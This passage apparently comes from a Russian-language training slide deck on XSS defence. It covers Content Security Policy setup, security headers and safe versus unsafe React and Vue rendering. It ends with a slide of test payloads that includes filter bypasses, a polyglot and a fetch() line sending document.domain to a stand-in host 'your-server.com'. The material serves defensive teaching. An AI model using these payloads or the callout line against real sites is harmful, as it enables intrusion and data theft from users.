      defaultSrc: ["'self'"],
      
      scriptSrc: [
        "'self'",
        (req, res) => \`'nonce-\${res.locals.nonce}'\`,
        'https://cdn.jsdelivr.net',
        "'strict-dynamic'" // Для современных браузеров
      ],
      
      styleSrc: [
        "'self'",
        "'unsafe-inline'", // Для inline стилей (по возможности избегайте)
        'https://fonts.googleapis.com'
      ],
      
      fontSrc: [
        "'self'",
        'https://fonts.gstatic.com'
      ],
      
      imgSrc: [
        "'self'",
        'data:',
        'https:'
      ],
      
      connectSrc: ["'self'"],
      frameSrc: ["'none'"],
      objectSrc: ["'none'"],
      baseUri: ["'self'"],
      formAction: ["'self'"],
      frameAncestors: ["'none'"],
      
      upgradeInsecureRequests: [],
      
      reportUri: ['/csp-report']
    },
    
    // Использовать Report-Only для тестирования
    reportOnly: false
  })
);

// Использование nonce в шаблонах
app.get('/', (req, res) => {
  res.send(\`
    <!DOCTYPE html>
    <html>
    <head>
      <title>CSP Protected Page</title>
    </head>
    <body>
      <h1>Protected by CSP</h1>
      
      <!-- Этот скрипт разрешен благодаря nonce -->
      <script nonce="\${res.locals.nonce}">
        console.log('Authorized script');
      </script>
      
      <!-- Этот скрипт будет заблокирован -->
      <script>
        alert('Blocked!');
      </script>
    </body>
    </html>
  \`);
});

app.listen(3000);`,
      },
    },

    {
      id: "slide-41",
      title: "Дополнительные заголовки безопасности",
      type: "list",
      content: "Другие HTTP заголовки для защиты от XSS:",
      items: [
        "X-Content-Type-Options: nosniff — предотвращает MIME-sniffing",
        "X-Frame-Options: DENY — защита от clickjacking",
        "X-XSS-Protection: 1; mode=block — встроенный XSS фильтр браузера (устарел)",
        "Referrer-Policy: strict-origin-when-cross-origin — контроль Referer заголовка",
        "Permissions-Policy — контроль доступа к API браузера",
        "Strict-Transport-Security — принудительное использование HTTPS",
      ],
    },

    {
      id: "slide-42",
      title: "Защита на уровне фреймворков",
      type: "content",
      content:
        "Современные фреймворки предоставляют встроенную защиту от XSS. React, Vue, Angular автоматически экранируют данные при рендеринге. Однако существуют опасные API (dangerouslySetInnerHTML в React, v-html в Vue), которые обходят защиту и должны использоваться с максимальной осторожностью только с санитизированными данными.",
    },

    {
      id: "slide-43",
      title: "XSS защита в React",
      type: "code",
      content: "Безопасная и небезопасная работа с данными в React:",
      codeExample: {
        language: "javascript",
        title: "XSS Protection in React",
        code: `import React from 'react';
import DOMPurify from 'dompurify';

function UserProfile({ user }) {
  // ✅ БЕЗОПАСНО - React автоматически экранирует
  return (
    <div>
      <h1>{user.name}</h1>
      <p>{user.bio}</p>
    </div>
  );
}

// ❌ ОПАСНО - dangerouslySetInnerHTML без санитизации
function UnsafeComponent({ html }) {
  return (
    <div dangerouslySetInnerHTML={{ __html: html }} />
  );
}

// ✅ БЕЗОПАСНО - с санитизацией через DOMPurify
function SafeHTMLComponent({ html }) {
  const sanitized = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href']
  });
  
  return (
    <div dangerouslySetInnerHTML={{ __html: sanitized }} />
  );
}

// ✅ БЕЗОПАСНО - Markdown с санитизацией
import ReactMarkdown from 'react-markdown';

function MarkdownComponent({ markdown }) {
  return (
    <ReactMarkdown
      // Только разрешенные элементы
      allowedElements={['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li']}
      // Удалять запрещенные элементы
      unwrapDisallowed={true}
    >
      {markdown}
    </ReactMarkdown>
  );
}

// ❌ ОПАСНО - пользовательский URL без проверки
function UnsafeLink({ url, text }) {
  return <a href={url}>{text}</a>;
}

// ✅ БЕЗОПАСНО - с валидацией URL
function SafeLink({ url, text }) {
  // Проверяем, что URL начинается с безопасного протокола
  const isSafeUrl = /^(https?:\/\/|mailto:|tel:)/.test(url);
  
  if (!isSafeUrl) {
    return <span>{text}</span>;
  }
  
  return (
    <a 
      href={url}
      rel="noopener noreferrer"
      target="_blank"
    >
      {text}
    </a>
  );
}

export { SafeHTMLComponent, MarkdownComponent, SafeLink };`,
      },
    },

    {
      id: "slide-44",
      title: "XSS защита в Vue.js",
      type: "code",
      content: "Безопасная работа с данными в Vue:",
      codeExample: {
        language: "javascript",
        title: "XSS Protection in Vue",
        code: `<template>
  <!-- ✅ БЕЗОПАСНО - Vue автоматически экранирует -->
  <div>
    <h1>{{ user.name }}</h1>
    <p>{{ user.bio }}</p>
  </div>
  
  <!-- ❌ ОПАСНО - v-html без санитизации -->
  <div v-html="userContent"></div>
  
  <!-- ✅ БЕЗОПАСНО - с санитизацией -->
  <div v-html="sanitizedContent"></div>
  
  <!-- ✅ БЕЗОПАСНО - привязка атрибутов -->
  <img :src="safeImageUrl" :alt="user.name">
  
  <!-- ❌ ОПАСНО - v-bind:href без проверки -->
  <a :href="userLink">Link</a>
  
  <!-- ✅ БЕЗОПАСНО - с проверкой URL -->
  <a :href="sanitizeUrl(userLink)" 
     rel="noopener noreferrer" 
     target="_blank">
    Link
  </a>
</template>

<script>
import DOMPurify from 'dompurify';

export default {
  data() {
    return {
      user: {
        name: 'John Doe',
        bio: 'Developer'
      },
      userContent: '<script>alert(1)</script>',
      userLink: 'javascript:alert(1)'
    };
  },
  
  computed: {
    // Санитизация HTML контента
    sanitizedContent() {
      return DOMPurify.sanitize(this.userContent, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
        ALLOWED_ATTR: []
      });
    },
    
    // Безопасный URL для изображений
    safeImageUrl() {
      const url = this.user.avatar;
      // Проверяем, что URL начинается с безопасного протокола
      if (/^https?:\/\//.test(url) || url.startsWith('data:image/')) {
        return url;
      }
      return '/default-avatar.png';
    }
  },
  
  methods: {
    // Санитизация URL
    sanitizeUrl(url) {
      // Только разрешенные протоколы
      const safe = /^(https?:\/\/|mailto:|tel:)/.test(url);
      return safe ? url : '#';
    }
  }
};
</script>`,
      },
    },

    {
      id: "slide-45",
      title: "Тестирование на XSS",
      type: "title",
      content: "Методы обнаружения XSS уязвимостей",
      keyPoints: [
        {
          title: "Ручное тестирование",
          description: "Систематический подход к поиску XSS",
        },
        {
          title: "Автоматизированные инструменты",
          description: "Сканеры и фреймворки для обнаружения XSS",
        },
        {
          title: "Тестовые payload",
          description: "Наборы векторов для проверки защиты",
        },
      ],
    },

    {
      id: "slide-46",
      title: "Методология ручного тестирования",
      type: "list",
      content: "Систематический подход к поиску XSS:",
      items: [
        "Определите все точки ввода пользовательских данных",
        "Проследите, где эти данные отображаются на страницах",
        "Определите контекст вывода (HTML, атрибут, JavaScript, URL)",
        "Попробуйте базовые payload для каждого контекста",
        "Проверьте, применяется ли фильтрация или экранирование",
        "Попытайтесь обойти фильтры с помощью различных техник",
        "Подтвердите выполнение JavaScript кода",
        "Задокументируйте найденные уязвимости",
      ],
    },

    {
      id: "slide-47",
      title: "Базовые XSS payload для тестирования",
      type: "code",
      content: "Набор тестовых векторов для разных контекстов:",
      codeExample: {
        language: "html",
        title: "XSS Testing Payloads",
        code: `<!-- Базовые payload -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>

<!-- Для тестирования без alert -->
<script>console.log('XSS')</script>
<img src=x onerror=console.log('XSS')>

<!-- Payload для HTML контекста -->
<b>test</b>
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.cookie)>

<!-- Payload для атрибутов -->
" onload="alert(1)
' onload='alert(1)
" onclick="alert(1)

<!-- Payload для JavaScript контекста -->
'; alert(1); //
'); alert(1); //
\'; alert(1); //

<!-- Payload для URL контекста -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>

<!-- Обход базовых фильтров -->
<ScRiPt>alert(1)</sCrIpT>
<img src=x onerror="alert(1)">
<svg/onload=alert(1)>
<img src=x onerror=alert\`1\`>

<!-- Payload для обнаружения Stored XSS -->
<script>fetch('http://your-server.com/found?'+document.domain)</script>

<!-- Polyglot payload (работает в разных контекстах) -->
jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e

<!-- Проверка длины фильтрации -->
<script>alert(1)</script>
<script>alert(12)</script>
<script>alert(123)</script>`,
      },
    },
  ],
};
